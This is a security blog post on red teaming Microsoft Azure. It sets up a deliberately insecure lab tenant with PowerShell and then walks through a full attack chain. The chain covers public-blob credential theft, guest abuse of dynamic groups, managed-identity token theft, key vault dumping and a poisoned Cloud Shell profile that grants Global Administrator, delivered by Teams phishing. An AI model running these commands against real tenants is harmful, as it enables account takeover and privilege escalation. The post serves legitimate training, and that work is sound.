# Read2Own: Red Teaming Microsoft Azure

This blog post will showcase different techniques for obtaining access to Azure from the internet, escalating privileges within Azure, lateral movement between service principals, resources and users, persistence, and exploitation.  
We've included a complete deployment guide including PowerShell scripts, so you can learn to abuse insecure Microsoft Azure configurations in your own tenant.  
Furthermore, we've also included the detection and improving security section, which will allow you to re-configure your vulnerable tenant to a more secure design and detect if any of these attacks have been performed against your own tenant. Feel free to try the different attack paths in your own environment and see how you easily can disrupt the attack chain by hardening your tenant.  
3 different sections will be covered:
* Deployment
* Attack Path (Overview and step-by-step)
* Detection & Improving Security  

Written by Casper Schjøtt & Nichlas Falk  
*This blog post is inspired by the fantastic [Dark Side Ops 3 – Azure Cloud Pentesting training course](https://www.netspi.com/training/dark-side-ops-azure-cloud-pentesting/) from NetSPI led by Karl Fosaaen, his amazing research, and the book “Penetration Testing Azure for Ethical Hacker” also co-written by [Karl Fosaaen](https://twitter.com/kfosaaen) together with [David Okeyode](https://twitter.com/asegunlolu).*

# Deployment
Obviously, we'll start at the deployment phase. If you wish to setup an Azure tenant but not sure how to go about it, follow along and soon you will be hacking all the clouds. Since the actual attacks and attack path has not been covered, some of the configurations may not make sense immediately. We will attempt to explain what we're doing as we go along.  
Purchase of license and initial AAD configuration is not covered. This lab is very cheap to run, any credits included with MSDN subscription or a new free Azure account will be sufficient.  
### Tenant information:
* Name: impros3c
* Primary domain: adsikkerhed.dk
* Subdomain: adsikkerhed.vault.azure.net
* Subdomain: adsikkerhed.blob.core.windows.net
    
## Deployment Steps
* Create AAD Users
```powershell
Connect-AzureAD
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = "%cP&KCuC48YEYs3l3t9o!fIJU"
$PasswordProfile.ForceChangePasswordNextLogin = $false

New-AzureADUser -DisplayName "nfp" -PasswordProfile $PasswordProfile `
-UserPrincipalName "nfp@adsikkerhed.dk" -AccountEnabled $true `
-MailNickName "nfp"

New-AzureADUser -DisplayName "AppOwner" -PasswordProfile $PasswordProfile `
-UserPrincipalName "AppOwner@adsikkerhed.dk" -AccountEnabled $true `
-MailNickName "AppOwner"

New-AzureADUser -DisplayName "privadmin" -PasswordProfile $PasswordProfile `
-UserPrincipalName "privadmin@adsikkerhed.dk" -AccountEnabled $true `
-MailNickName "privadmin"

New-AzureADUser -DisplayName "AutomationAdmin" -PasswordProfile $PasswordProfile `
-UserPrincipalName "AutomationAdmin@adsikkerhed.dk" -AccountEnabled $true `
-MailNickName "AutomationAdmin"
```

* Create CSV file that includes username and password.
```powershell
[pscustomobject]@{username = 'nfp@adsikkerhed.dk';password = '%cP&KCuC48YEYs3l3t9o!fIJU';} | `
Export-Csv -Path .\test.csv -Append -NoTypeInformation -Delimiter ";" -Encoding UTF8
```
* Create [resource group](https://docs.microsoft.com/en-us/azure/azure-resource-manager/management/manage-resource-groups-portal#what-is-a-resource-group) "STORAGE"
* Create [storage account](https://docs.microsoft.com/en-us/azure/storage/common/storage-account-overview) "ADSIKKERHED"
* Select [Enable Blob Public Access](https://docs.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure?tabs=portal) and connectivity [Public Endpoint](https://docs.microsoft.com/en-us/azure/storage/files/storage-files-networking-endpoints?tabs=azure-portal) - All default
* Disable [Secure Transfer](https://docs.microsoft.com/en-us/azure/storage/common/storage-require-secure-transfer) requirement
* Create [Blob container](https://docs.microsoft.com/en-us/azure/storage/blobs/storage-blobs-introduction) named "files" with public access level "Container"
* Upload test.csv to "files" blob
* Final URL: https://adsikkerhed.blob.core.windows.net/files/test.csv

```powershell
$resourceGroup = "STORAGE"
$location = "northeurope"
New-AzResourceGroup -Name $resourceGroup -Location $location

$StorageAccountProv = @{
  ResourceGroupName       = $resourceGroup
  Name                    = 'adsikkerhed'
  SkuName                 = 'Standard_LRS'
  Location                = $location
  EnableHttpsTrafficOnly  = $false
}
$StorageAccount = New-AzStorageAccount @StorageAccountProv
$Context = $StorageAccount.Context

$ContainerName = 'files'
New-AzStorageContainer -Name $ContainerName -Context `
$Context -Permission Container

$TestCSV = @{
  File             = '.\test.csv'
  Container        = $ContainerName
  Blob             = "test.csv"
  Context          = $Context
  StandardBlobTier = 'Hot'
}
Set-AzStorageBlobContent @TestCSV
```

* Create [Dynamic Group](https://docs.microsoft.com/en-us/azure/active-directory/enterprise-users/groups-dynamic-membership) named "AutomationAdmins"
* Make it add any user with "automationadmin" in displayname
```powershell
Import-Module AzureADPreview -Force
New-AzureADMSGroup -DisplayName "AutomationAdmins" -Description `
"This dynamic group will add any AAD user with 'automationadmin' in Display Name" `
-MailEnabled $False -MailNickName "AutomationAdmins" -SecurityEnabled $True `
-GroupTypes "DynamicMembership" -MembershipRule `
'(user.displayName -contains "automationadmin")' `
-MembershipRuleProcessingState "On"
```

* Assign "AutomationAdmins" to the "Automation Contributor" role in Subscription IAM
* [Automation Contributor role explanation](https://docs.microsoft.com/en-us/azure/automation/automation-role-based-access-control#:~:text=The%20Automation%20Contributor%20role%20allows,permissions%20to%20an%20Automation%20account)
```powershell
$AutomationAdminsID = (Get-AzADGroup -DisplayName AutomationAdmins).id
New-AzRoleAssignment -ObjectId $AutomationAdminsID `
-RoleDefinitionName "Automation Contributor"
```

* Create a [Service Principal](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals#service-principal-object) and assing it to the "Virtual Machine Contributor" role in subscription IAM
* [Virtual Machine Contributor role explanation](https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#virtual-machine-contributor)
```powershell
az login
az ad sp create-for-rbac --name VMContributor --role "Virtual Machine Contributor"
```

* Create a standalone [Automation Account](https://docs.microsoft.com/en-us/azure/automation/automation-create-standalone-account) called "AutomationAccount"
```powershell
$resourceGroup = "AUTOMATION"
$location = "northeurope"
New-AzResourceGroup -Name $resourceGroup -Location $location

New-AzAutomationAccount -Name "AutomationAccount" -Location $location -ResourceGroupName $resourceGroup
```

* Import PowerShell script as [Automation Runbook](https://docs.microsoft.com/en-us/azure/automation/automation-runbook-types#powershell-runbooks)
```powershell
$params = @{
    AutomationAccountName = 'AutomationAccount'
    Name                  = 'RunBookPowerShell'
    ResourceGroupName     = 'AUTOMATION'
    Type                  = 'PowerShell'
    Path                  = '.\VMContribScript.ps1'
}
Import-AzAutomationRunbook @params
```

* Create a VM with a [User assigned managed identity](https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview)
```powershell
$rgName = 'VMRG'
$location = 'northeurope'
New-AzResourceGroup -Name $rgName -Location $location

## Create IP. ##
$ip = @{
    Name = 'AZVMPUBLICIP'
    ResourceGroupName = $rgName
    Location = $location
    Sku = 'Standard'
    AllocationMethod = 'Static'
    IpAddressVersion = 'IPv4'
    Zone = 1,2,3   
}

New-AzPublicIpAddress @ip

# Create a Virtual Machine
$vmName = 'AZHACK'
$userName = 'rootnation'
$plainTextPassword = '6#d_PL)tC@%2D[N'
$securePassword = $plainTextPassword | ConvertTo-SecureString -AsPlainText -Force
$credential = [pscredential]::new($userName, $securePassword)
$vm = New-AzVM -ResourceGroupName $rgName -Name $vmName `
-Location $location -Credential $credential -PublicIpAddressName 'AZVMPUBLICIP'

#Allow all inbound to VM
Get-AzNetworkSecurityGroup -Name $vmName -ResourceGroupName $rgName `
| Add-AzNetworkSecurityRuleConfig -Name "ALL" -Description "Allow all ports" `
-Access "Allow" -Protocol "Tcp" -Direction "Inbound" -Priority 100 `
-SourceAddressPrefix "*" -SourcePortRange "*" -DestinationAddressPrefix "*" `
-DestinationPortRange "*" | Set-AzNetworkSecurityGroup

Install-Module -Name Az.ManagedServiceIdentity -Scope CurrentUser
$identityName = 'AZHACKManagedIdentity'
$identity = New-AzUserAssignedIdentity -Name $identityName `
-ResourceGroupName $rgName -Location $location

Update-AzVM -ResourceGroupName $rgName -VM $vm `
-IdentityType UserAssigned -IdentityID $identity.Id
```

* Create [key vault](https://docs.microsoft.com/en-us/azure/key-vault/general/basic-concepts) named "ADSIKKERHED" and assign the managed identity principal access to list and get secrets
```powershell
$keyVaultName = 'ADSIKKERHED'
$keyVault = New-AzKeyVault -ResourceGroupName $rgName `
-Name $keyVaultName -Location $location

$secretValue = ConvertTo-SecureString -String $PasswordProfile.Password -AsPlainText -Force
Set-AzKeyVaultSecret -VaultName $keyVaultName `
-Name AppOwner -SecretValue $secretValue

New-AzRoleAssignment -RoleDefinitionName Reader `
-Scope $keyVault.ResourceId -ObjectId $identity.PrincipalId

Set-AzKeyVaultAccessPolicy -ResourceGroupName $rgName -VaultName $keyVaultName `
-ServicePrincipalName $identity.ClientId -PermissionsToSecrets get,list
```

* Create a new [application](https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-how-applications-are-added) from "App registration" in AzureAD ([Performed in GUI](https://docs.microsoft.com/en-us/azure/active-directory/develop/quickstart-register-app#register-an-application)) and name it "HackingApp"
* Assing the Service Principal (HackingApp) Storage Account Contributor on the [Management Group](https://docs.microsoft.com/en-us/azure/governance/management-groups/overview) (Must be performed using the GUI)  
* [Storage Account Contributor role explanation](https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#storage-account-contributor)

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/HackingApp.png?raw=true)

* Make "AppOwner" the owner of the hacking application
```powershell
$ObjectID = Get-AzureADApplication -Filter "DisplayName eq 'HackingApp'" `
| Select-Object ObjectID
$RefObjectId = Get-AzureADUser -Filter `
"userPrincipalName eq 'AppOwner@adsikkerhed.dk'" | Select-Object ObjectID
Add-AzureADApplicationOwner -ObjectId $ObjectID.ObjectId  -RefObjectId $RefObjectId.ObjectId
$ObjectID = Get-AzureADServicePrincipal -SearchString HackingApp | Select-Object ObjectID
Add-AzureADServicePrincipalOwner -ObjectId $ObjectID.ObjectId -RefObjectId $RefObjectId.ObjectId
```



* Grant the "privadmin" user "Privileged Role Administrator" role
* [Privileged Role Administrator role explanation](https://docs.microsoft.com/en-us/azure/active-directory/roles/permissions-reference#privileged-role-administrator)
```powershell
$user = Get-AzureADUser -Filter "userPrincipalName eq 'privadmin@adsikkerhed.dk'"
$roleDefinition = Get-AzureADMSRoleDefinition -Filter "displayName eq 'Privileged Role Administrator'"
$roleAssignment = New-AzureADMSRoleAssignment -DirectoryScopeId '/' `
-RoleDefinitionId $roleDefinition.Id -PrincipalId $user.objectId
```

* Grant the "privadmin" user access to a new resource group so a [cloud shell](https://docs.microsoft.com/en-us/azure/cloud-shell/features) can be created
```powershell
$resourceGroup = "CLOUDSHELL"
$location = "northeurope"
New-AzResourceGroup -Name $resourceGroup -Location $location

New-AzRoleAssignment -ObjectId $user.ObjectId `
-RoleDefinitionName "Contributor" `
-ResourceGroupName $resourceGroup

New-AzRoleAssignment -ObjectId $user.ObjectId `
-RoleDefinitionName "Reader" `
-ResourceGroupName $resourceGroup
```

* Sign in as the privadmin user and setup a Cloud Shell  

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/CloudShell.png?raw=true)
  


# Attack Path
The following section is a high level description of the attack path.

## Unauthenticated
* Enumerate subdomains w/ MicroBurst
* Enumerate blob for public storage w/ MicroBurst
* Read excel sheet with credentials (regular Azure AD user) from public storage container
* MFA sweep to ensure no MFA or CA policies blocking w/ MFASweep
* Connect to Azure w/ PowerShell Az (User from container (nfp))

## Authenticated (Reader)
* Find group with dynamic membership that's assigned as "Automation Contributor" on Subscription. Dynamic group searches for "automationadmin" in displayname
* Create email identity with "automationadmin" in the name, such as "nichlas.automationadmin@protonmail.com"
* Invite guest user into victim tenant and accept
* Connect to victim tenant w/ guest user and dump Automation Account runbooks w/ MicroBurst
* From a dumped runbook, gather credentials for a service principal (VMContributor) which is "virtual machine contributor" on the subscription
* Connect to Azure w/ SP

## Authenticated (Virtual Machine Contributor on Subscription)
* Invoke PowerShell on virtual machine to discover that it's configured with a managed identity (AZHACKManagedIdentity)
* Dump access token for management.azure.com and vault.azure.net
* Impersonate managed identity and read secret from key vault
* Secret includes credentials for another user (AppOwner)
* Connect to Azure w/ PowerShell Az and discover that the user is owner of an application which its SP is "Storage Account Contributor" on the Management Group, which includes the subscription and all its inherited resources
* Add a new secret to the SP and authenticate as the SP w/ PowerShell Az
## Authenticated (Storage Account Contributor on Management Group)
* Discover a storage account which includes the image file from a cloud shell profile
* Discover that the cloud shell image file is owned by a user which is assigned the Azure AD role "Privileged Role Administrator"
* Download the image file, mount it, poision it and upload it again
* Conduct internal phishing against the target with AADInternals and link to https://shell.azure.com/
* When target opens the phish, our guest user will be assigned the role "Global Administrator" in the Azure AD tenant

## Authenticated (Global Administrator in the Azure AD tenant)
* Authenticate to the target Azure tenant with the portal, and elevate yourself to "User Access Administrator" on the Tenant Root Management Group

## Authenticated (User Access Administrator)
* You have now complete ownership of both the Azure AD tenant and all Azure resources
  
  
  
# Attack walk-through
The following sections describe the attack path in detail and how it is executed.  

## **Unauthenticated (Anonymous)**

In this particular case we assume the specific subdomain names on our target company. This will obviously be done through basic OSINT in real world engagements. Armed with the subdomain name knowledge, we initiate an enumeration of azure subdomains with the base "adsikkerhed". This base will differ between companies and their names.

### 1. Enumerate subdomains w/ MicroBurst

#### **Tools used**
> [MicroBurst](https://github.com/NetSPI/MicroBurst), PowerShell

```powershell
Import-Module .\MicroBurst\MicroBurst.psm1
Invoke-EnumerateAzureSubDomains -Base adsikkerhed
```

We now realize that the company has a storage account with the name "adsikkerhed", and we then iniate a targeted brute force enumeration attack against that storage account, which should reveal any blobs and containers with public access. We then grab the public available csv file and read its content

### 2. Enumerate storage accounts blob for public accessible data w/ MicroBurst

#### **Tools used**
> [MicroBurst](https://github.com/NetSPI/MicroBurst), PowerShell

```powershell
Invoke-EnumerateAzureBlobs -Base adsikkerhed
Invoke-WebRequest "https://adsikkerhed.blob.core.windows.net/files/test.csv" -OutFile .\output\test.csv
Get-Content .\output\test.csv
```

### 3. Enumerate potential MFA requirements or Conditonal Access policies that could block the logon attempt from the compromised credentials

#### **Tools used**
> [MFASweep](https://github.com/dafthack/MFASweep), PowerShell, [Az Module](https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-7.1.0)

```powershell
Import-Module .\MFASweep\MFASweep.ps1
Invoke-MFASweep -Username "nfp@adsikkerhed.dk" -Password "%cP&KCuC48YEYs3l3t9o!fIJU"

Install-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force
Import-Module Az
$Credentials = Get-Credential
Connect-AzAccount -Credential $Credentials
```

## **Authenticated (Reader)**

### 4. Enumerate cloud groups and search for specific groups with dynamic membership

#### **Tools used**
> PowerShell, [AzureAD Module](https://docs.microsoft.com/en-us/powershell/azure/active-directory/install-adv2?view=azureadps-2.0), [Azure Portal](https://portal.azure.com), [Az CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli), [MicroBurst](https://github.com/NetSPI/MicroBurst)

```powershell
Install-Module -Name AzureADPreview -Scope CurrentUser -Repository PSGallery -Force
Connect-AzureAD
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
```

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/Dynamic%20Group%20Membership%20-%20pwsh.png?raw=true)



```powershell
# Grab the Id for the AutomationAdmins group and search for potential resource permission delegation
az role assignment list --assignee 4ec58299-dcc1-4df3-84f6-bb63fd2f0f37 --include-inherited --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'
```

### 5. Exploit the dynamic membership rules and invite your own guest user

1. Stay in the portal and navigate to Azure AD > Users > New Guest user
2. Invite user and fill in the necessary. This user is owned by the attacker from another domain, and make sure to comply with the dynamic membership rules for successfully groupmembership
3. When satisified hit the "Invite"
4. Navigate to your attacker owned users mailbox and accept the invite
5. When the invitation has been accepted and the dynamic membership rules has been updated, you find yourself member of the AutomationAdmins group
  
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/GuestInvitation.png?raw=true)
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/AutomationAdmins-members.png?raw=true)

### 6. Dump the Automation Account runbooks

```powershell
# With the freshly invited guest user, utilize the "Automation Contributor" RBAC role and dump runbooks from the Automation Account with MicroBurst
Connect-AzAccount <guest user>
Import-Module .\MicroBurst\MicroBurst.psm1
New-Item -Path . -Name adsikkerhed-output -Type Directory
Get-AzDomainInfo -folder .\adsikkerhed-output\ -Users Y -Groups N -StorageAccounts N -VMs N -NetworkInfo N -RBAC N
Get-Content .\adsikkerhed-output\Az\ADSIKKERHED\Resources\AutomationAccounts\AutomationAccount\RunBookPowerShell.ps1
```

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/Runbook-creds.png)

### 7. Authenticate as the Service Principal

```powershell
Get-AzADServicePrincipal -DisplayName VMContributor
$AppID = 'a30bc8bd-602a-49b2-9708-45a3792a629a'
$Secret = 'TDX3P4SKvg6WHKk4a_Ltko2w~dy.xKytdg'
$TenantID = '2230b2b1-298b-4b13-9de5-852b1d16f118'
$SecureStringPWD = ConvertTo-SecureString $Secret -AsPlainText -Force
[PSCredential]$Credentials = New-Object System.Management.Automation.PSCredential ($AppID, $SecureStringPWD)
Connect-AzAccount -Credential $Credentials -ServicePrincipal -Tenant $TenantID

az login --service-principal -u a30bc8bd-602a-49b2-9708-45a3792a629a -p "TDX3P4SKvg6WHKk4a_Ltko2w~dy.xKytdg" -t 2230b2b1-298b-4b13-9de5-852b1d16f118
```

## **Authenticated (Virtual Machine Contributor on Subscription)**

#### **Tools used**
> PowerShell, [AzureAD Module](https://docs.microsoft.com/en-us/powershell/azure/active-directory/install-adv2?view=azureadps-2.0), [MicroBurst](https://github.com/NetSPI/MicroBurst)

### 8. Search for Virtual Machines

```powershell
$VMs = Get-AzVM -Status | Where-Object {($_.PowerState -EQ "VM running") -and ($_.StorageProfile.OSDisk.OSType -eq "Windows")}
```

### 9. Create a script called "jobs.ps1" and save it with the following code

```powershell
(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Method GET -Headers @{Metadata="true"} -UseBasicParsing).Content

(Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -Method GET -Headers @{Metadata="true"} -UseBasicParsing).Content
```

### 10. Execute the script via the RunCommand feature to discover if the Virtual Machine is attached and configured with a Managed Identity

```powershell
$VMs | Invoke-AzVMRunCommand -CommandId 'RunPowershellScript' -ScriptPath .\jobs.ps1
```
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/tokensdump.png?raw=true)

### 11. Save the tokens as variables

```powershell
$mgmtToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzIyMzBiMmIxLTI5OGItNGIxMy05ZGU1LTg1MmIxZDE2ZjExOC8iLCJpYXQiOjE2NDE5ODY2MjEsIm5iZiI6MTY0MTk4NjYyMSwiZXhwIjoxNjQyMDczMzIxLCJhaW8iOiJFMlpnWUJETi9wSVFHSmx1STdNdFo3azZ4K2tGQUE9PSIsImFwcGlkIjoiMzZiZGE3ZjQtODJhOS00N2NiLTg2ZjctODE2YTdkMmZhNjRhIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMjIzMGIyYjEtMjk4Yi00YjEzLTlkZTUtODUyYjFkMTZmMTE4LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiMzA4YTY4N2MtMTdhNC00ODdjLWE4OGUtYTJiZGIxYmZjMWFkIiwicmgiOiIwLkFWNEFzYkl3SW9zcEUwdWQ1WVVySFJieEdQU252VGFwZ3N0SGh2ZUJhbjB2cGtwZUFBQS4iLCJzdWIiOiIzMDhhNjg3Yy0xN2E0LTQ4N2MtYTg4ZS1hMmJkYjFiZmMxYWQiLCJ0aWQiOiIyMjMwYjJiMS0yOThiLTRiMTMtOWRlNS04NTJiMWQxNmYxMTgiLCJ1dGkiOiJtSnpuRUxlS2ZFZVBDTVpuVE1KNEFRIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvZDM3ZjMwZjQtZDM5ZC00YzM0LWIxMzktZTMxYjZiZWMyMDAyL3Jlc291cmNlZ3JvdXBzL1ZNL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvU2VjdXJlV29ya3N0YXRpb24iLCJ4bXNfdGNkdCI6IjE1OTM1MTMzOTgifQ.FPoAmTq-85Nsc9s3OkJzeKJJfnMBQJxxPtr1p_UFzKEwQDn3tcm4rw0m3NbO69xK5sOiLddx-72X4RJ9NhSD_MhARKmlu0bUFuUKdp34ytcmnNBbEO_Gyi-kaM4eDtiW7ehi-YDRoJoPhRujYsbi3DOtAmDzztlOkerS4hsfFSUkbrcgvq-n4ow7mQ9uiNl97gdL2ovuOVTbObTMPuSKQrf4Iu09jF_wc-uvOfhnFgpEGXujSzPZuLgrzlMXN1qDTzgr4z7jTT8UJtC7Ye9Nr24ND4LFkY8NH0-3XH5s9txiYA9AjttzUzJQ6BJIQQ0n2KC1BtyF2bq1FeJui9GFVg"

$vaultToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL3ZhdWx0LmF6dXJlLm5ldCIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzIyMzBiMmIxLTI5OGItNGIxMy05ZGU1LTg1MmIxZDE2ZjExOC8iLCJpYXQiOjE2NDE5ODY2MjEsIm5iZiI6MTY0MTk4NjYyMSwiZXhwIjoxNjQyMDczMzIxLCJhaW8iOiJFMlpnWU9pSjUvdFRjM242dmY2ZmhRa0NoLzg3QWdBPSIsImFwcGlkIjoiMzZiZGE3ZjQtODJhOS00N2NiLTg2ZjctODE2YTdkMmZhNjRhIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMjIzMGIyYjEtMjk4Yi00YjEzLTlkZTUtODUyYjFkMTZmMTE4LyIsIm9pZCI6IjMwOGE2ODdjLTE3YTQtNDg3Yy1hODhlLWEyYmRiMWJmYzFhZCIsInJoIjoiMC5BVjRBc2JJd0lvc3BFMHVkNVlVckhSYnhHUFNudlRhcGdzdEhodmVCYW4wdnBrcGVBQUEuIiwic3ViIjoiMzA4YTY4N2MtMTdhNC00ODdjLWE4OGUtYTJiZGIxYmZjMWFkIiwidGlkIjoiMjIzMGIyYjEtMjk4Yi00YjEzLTlkZTUtODUyYjFkMTZmMTE4IiwidXRpIjoiR3JJSnNwNU4zRXl0c2JxaW0wRGlCUSIsInZlciI6IjEuMCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2QzN2YzMGY0LWQzOWQtNGMzNC1iMTM5LWUzMWI2YmVjMjAwMi9yZXNvdXJjZWdyb3Vwcy9WTS9wcm92aWRlcnMvTWljcm9zb2Z0LkNvbXB1dGUvdmlydHVhbE1hY2hpbmVzL1NlY3VyZVdvcmtzdGF0aW9uIn0.t3CPT4qSKjVk6JgY_yULfFpdoOFaShSPFCyw0607QjbfjBlZnz2Ftn5OLHn1HOeRAfoivVVyz0Rh5mM0ZglL7wB9N6PGf6BfElZOk6QMfPlwZzzcrlS6UeRm6t-QLyRliAKXRdEuf03nbFCYzxd2ns8l2njG3YmaQmwNknxUdyj6tIftrRkz8zc4PhfHWHEcSnTRFROHs27jPxbDwGCzyVEPQVQ2jW0pFYMRFxkgQVCLQyJ6VqP-EoWN8TIwrr28zx2gHn-gufOsTi5GkVR0lqJ5AUqqlm-e0t7fh5lO_XoUPo4NkARRih1So__P6HOwERbAItxfXZqSM_05p1n03Q"
```

### 12. Dump the key vault secret with MicroBurst

```powershell
cd .\MicroBurst\REST
Import-Module .\MicroBurst-AzureREST.psm1
Get-AzKeyVaultSecretsREST -managementToken $mgmtToken -vaultToken $vaultToken -Verbose -SubscriptionId (Get-AzContext).Subscription.Id
```

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/MI%20-%20key%20vault%20dump.png?raw=true)

### 13. Authenticate as the compromised user "AppOwner"

```powershell
# User = AppOwner@adsikkerhed.dk
# Password = oRSTyQnaSa62%ldxlVo3Wx&2t!
$Credentials = Get-Credential
Connect-AzureAD -Credential $Credentials
```

### 14. Enumerate (AzureHound) and discover ownership of an app registration and its service principal
```powershell
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile AzureHound.ps1 -UseBasicParsing
Import-Module .\AzureHound.ps1
$path = (Get-Location).Path+"\output"
Invoke-AzureHound -OutputDirectory $path
```
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/hackingappowner.png?raw=true)

### 15. Add secret to owned service principal

```powershell
$ServicePrincipal = Get-AzureADServicePrincipal -Filter "DisplayName eq 'HackingApp'"
New-AzureADServicePrincipalPasswordCredential -ObjectId $ServicePrincipal.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "06-07-2021 12:00:00" -Value SuperDuperPassword
```

### 16. Authenticate as the service principal

```powershell
$AppID = $ServicePrincipal.AppId
$Secret = 'SuperDuperPassword'
$TenantID = '2230b2b1-298b-4b13-9de5-852b1d16f118'
$SecureStringPWD = ConvertTo-SecureString $Secret -AsPlainText -Force
[PSCredential]$Credentials = New-Object System.Management.Automation.PSCredential ($AppID, $SecureStringPWD)
Connect-AzAccount -Credential $Credentials -ServicePrincipal -Tenant $TenantID
```

```bash
# AppId: 4253003a-bd22-4b6c-a536-cc532d74483b
# Secret: SuperDuperPassword
# Tenant: 2230b2b1-298b-4b13-9de5-852b1d16f118

az login -u 4253003a-bd22-4b6c-a536-cc532d74483b -p SuperDuperPassword -t 2230b2b1-298b-4b13-9de5-852b1d16f118 --allow-no-subscriptions --service-principal
```

## **Authenticated (Storage Account Contributor on Management Group)**

#### **Tools used**
> [WSL (Ubuntu)](https://ubuntu.com/wsl), [Az CLI](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli), [AADInternals](https://o365blog.com/aadinternals/)


### 17. Enumerate for RBAC permissions 
```bash
az role assignment list --assignee 4253003a-bd22-4b6c-a536-cc532d74483b --include-inherited --all --query '[].{username:principalName, role:roleDefinitionName, usertype:principalType, scope:scope}'
```

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/hackingapplication%20as%20storage%20account%20contributor.png?raw=true)

### 18. Enumerate keys, storage accounts, shares and files

```bash
az storage account list --query '[].{Name:name}'
az storage share list --account-name cloudshellprivadmin
az storage file list --share-name cspa --account-name cloudshellprivadmin
az storage account keys list -n cloudshellprivadmin
```

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/cloudenum.png?raw=true)

### 19. Download the image file, mount it, poison it, and upload it back again to the storage account

```powershell
az storage file download-batch -d C:\Users\Azure\output -s cspa --account-name cloudshellprivadmin --account-key "FzfTMIy/dLhhlKo3lgQ91iF8mFgQ2eiXc2ECmeEvI3YjQCaf7QoE107r80awbsOAt/Y822+MdASDjZ1Ps+FBwQ=="
ubuntu.exe
```
```bash
cd /mnt/c/Users/Azure/output/.cloudconsole
sudo mkdir /cloudpoison
sudo mount acc_privadmin.img /cloudpoison
cd /cloudpoison
sudo mkdir .config
sudo mkdir .config/PowerShell
sudo touch .config/PowerShell/Microsoft.PowerShell_profile.ps1
sudo chmod 777 .config/PowerShell/Microsoft.PowerShell_profile.ps1
echo "Connect-AzureAD; Add-AzureADDirectoryRoleMember -ObjectId 1246bcfd-42dc-4bb7-a86d-3637ca422b21 -RefObjectId 1D8B2447-8318-41E5-B365-CB7275862F8A" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1
sudo umount /cloudpoison
exit
```
```powershell
az storage file upload --account-key "FzfTMIy/dLhhlKo3lgQ91iF8mFgQ2eiXc2ECmeEvI3YjQCaf7QoE107r80awbsOAt/Y822+MdASDjZ1Ps+FBwQ==" --account-name cloudshellprivadmin --share-name cspa --path ".cloudconsole/acc_privadmin.img" --source ".\output\.cloudconsole\acc_privadmin.img"
```
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/uploadpoison.png?raw=true)

### 20. Trick the privadmin user to open the cloud shell with internal phishing

Shorten the https://shell.azure.com/ URL with bitly or something else 

```powershell
Install-Module AADInternals
Import-Module AADInternals

$Credentials = Get-Credential

# Get access token for Teams
Get-AADIntAccessTokenForTeams -Credentials $Credentials -SaveToCache

Send-AADIntTeamsMessage -Recipients "privadmin@adsikkerhed.dk" -Message "Check this site out, trust me its not a rickroll: https://bit.ly/3FjFPVh"

```
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/SPhish.png?raw=true)
![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/Teams%20internal%20phishing.png?raw=true)

### 21. When entering the link the privadmin gets served with the azure cloud shell. What he doesn't know is that the poisoned cloud image is granting our guest user "Global Administrator" rights in the Azure AD tenant when the powershell profile gets loaded

![alt text](https://github.com/improsec/2Cloudz/blob/main/readme-screenshots/Teams%20internal%20phishing%20-%20cloudshell.png?raw=true)

